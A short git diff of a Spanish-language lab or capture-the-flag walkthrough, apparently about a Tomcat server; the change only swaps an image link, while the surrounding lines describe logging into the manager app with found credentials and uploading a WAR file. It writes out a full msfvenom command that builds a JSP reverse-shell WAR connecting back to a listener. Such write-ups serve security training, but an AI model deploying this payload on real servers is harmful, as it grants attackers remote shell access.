@@ -21,7 +21,9 @@ intentamos con las credenciales
 entramos al "magaer app" con esas credenciales
 
 encontramos la parte de WAR file to deploy, donde se suben archivos .war
-![[war.png]]
+
+![image](https://github.com/user-attachments/assets/38e15592-832a-4c5f-996e-0bcdcf2e1a19)
+
 para poder tener una conexión RCE utilizamos: msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=443 -f war -o revshell.war
 
 lo lanzamos y nos crea un:   revshell.war
